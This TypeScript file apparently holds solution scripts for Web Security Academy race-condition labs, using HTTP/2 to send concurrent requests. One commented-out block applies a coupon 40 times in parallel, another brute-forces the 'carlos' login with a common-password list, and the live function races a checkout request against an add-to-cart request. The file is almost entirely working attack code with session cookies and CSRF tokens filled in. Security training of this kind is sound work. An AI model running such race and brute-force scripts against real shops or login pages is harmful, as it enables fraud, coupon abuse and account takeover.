import http2, { ClientHttp2Session } from "http2";

// // 1
// const client1 = http2.connect(
//   "https://0aeb00a00410a86b81408080007800c2.web-security-academy.net",
// );
// const client2 = http2.connect(
//   "https://0aeb00a00410a86b81408080007800c2.web-security-academy.net",
// );
// const sp = new URLSearchParams();
// sp.append("csrf", "eR7LzJBiKxvQVa8HadtAQcjUw6iYeWtN");
// sp.append("coupon", "PROMO20");
// const body = sp.toString();
// const contentLength = Buffer.byteLength(body);
// function applyCoupon(client: ClientHttp2Session, idx: number) {
//   const request = client.request({
//     ":method": "POST",
//     ":path": "/cart/coupon",
//     "Content-Type": "application/x-www-form-urlencoded",
//     Cookie: "session=D3JPEkSb1gMHkQY9BjgzZZCqZm5kxXN0",
//     "Content-Length": contentLength,
//   });
//   request.end(body);
//   // const chunks: any[] = []
//   request.on("response", (headers) => {
//     const isSuccess =
//       headers.location === "/cart" && headers[":status"] === 302;
//     console.log({ isSuccess, client: idx % 2 === 0 ? "client1" : "client2" });
//   });
//   // request.on('data', (chunk) => chunks.push(chunk))
//   // request.on('end', () => console.log(Buffer.concat(chunks).toString('utf8')))
// }
// Array(40)
//   .fill(0)
//   .map((_, idx) =>
//     idx % 2 === 0 ? applyCoupon(client1, idx) : applyCoupon(client2, idx),
//   );

// function lab2 () {
//   const passwords = `123123
// abc123
// football
// monkey
// letmein
// shadow
// master
// 666666
// qwertyuiop
// 123321
// mustang
// 123456
// password
// 12345678
// qwerty
// 123456789
// 12345
// 1234
// 111111
// 1234567
// dragon
// 1234567890
// michael
// x654321
// superman
// 1qaz2wsx
// baseball
// 7777777
// 121212
// 000000`.split('\n');
//   const clientHttp2Session = http2.connect('https://0a150020039eb5c480f16289008700c0.web-security-academy.net')
//   for (const password of passwords) {
//     const stream = clientHttp2Session.request({
//       "content-type": "application/x-www-form-urlencoded",
//       ":path": "/login",
//       ":method": "POST",
//       "cookie": "session=on0zOCAuNADvlSMo1j52etH30UIKqVx2"
//     })
//     stream.end(`csrf=LIsY5AzRWv4fJXFtqa0kbkxm6tEok6OY&username=carlos&password=${password}`)
//     stream.on('response', (headers) => {
//       console.log(headers[":status"])
//       if (headers[":status"] === 302) console.log(password)
//     })
//   }
//   console.log('ok')
// }

// lab2()

function lab3() {
  const cookie = "session=5ZWx7xl6NJB2OcEUV7ZhFzjhez0vqYM8";
  const clientHttp2Session = http2.connect(
    "https://0a3800f503887485807b0dc400a100a0.web-security-academy.net",
  );

  const checkoutStream = clientHttp2Session.request({
    "content-type": "application/x-www-form-urlencoded",
    ":path": "/cart/checkout",
    ":method": "POST",
    cookie: cookie,
  });
  checkoutStream.end("csrf=RdBIuGJJsR6fKUzTjis1nr4zhLS7T3Yv");

  const addToCartStream = clientHttp2Session.request({
    "content-type": "application/x-www-form-urlencoded",
    ":path": "/cart",
    ":method": "POST",
    cookie: cookie,
  });
  addToCartStream.end("productId=1&redir=PRODUCT&quantity=1");
}

lab3();
